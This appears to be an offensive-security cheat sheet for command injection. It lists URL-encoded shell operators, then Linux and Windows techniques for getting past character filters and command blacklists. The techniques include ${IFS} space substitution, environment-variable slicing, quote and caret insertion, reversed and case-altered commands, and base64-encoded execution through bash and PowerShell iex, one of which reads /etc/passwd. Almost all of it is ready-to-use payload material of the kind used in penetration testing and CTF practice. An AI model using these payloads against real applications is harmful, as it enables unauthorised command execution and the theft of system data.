```
;    %3b
\n   %0a
&    %26
|    %7c
&&   %26%26
||   %7c%7c
``   %60%60
$()  %24%28%29
```

<img width="771" height="558" alt="image" src="https://github.com/user-attachments/assets/951a3a0c-4a89-451d-a407-9db572d9e71d" />

## Filtered Character Bypass
```
printenv
```
**Spaces
```
%09
${IFS}
{ls,-la}
```
**Other Characters
```
${PATH:0:1}
${LS_COLORS:10:1}
$(tr '!-}' '"-~'<<<[)
```
- /
- ;
- shift character by one [ -> \

## Linux

## Blacklisted Command Bypass
**Character Insertion
```
' or "
$@ or \
```
**Case Manipulation
```
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
```
**Reversed Commands
```
echo 'whoami' | rev
$(rev<<<'imaohw')
```
**Encoded Commands
```
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```


## Windows

## Filtered Character Bypass
```
Get-ChildItem Env:
```
- Powershell

**Spaces
```
%09
%PROGRAMFILES:~10,-5%
$env:PROGRAMFILES[10]
```
- Second is CMD
- Third is Powershell

**Other Characters
```
%HOMEPATH:~0,-17%
$env:HOMEPATH[0]
```
- \ in CMD
- \ in powershell

## Blacklisted Command Bypass

**Character Insertion
```
' or "
^
```
**Case Manipulation
```
WhoAmi
```
**Reversed Commands
```
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"
```
**Encoded Commands
```
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```
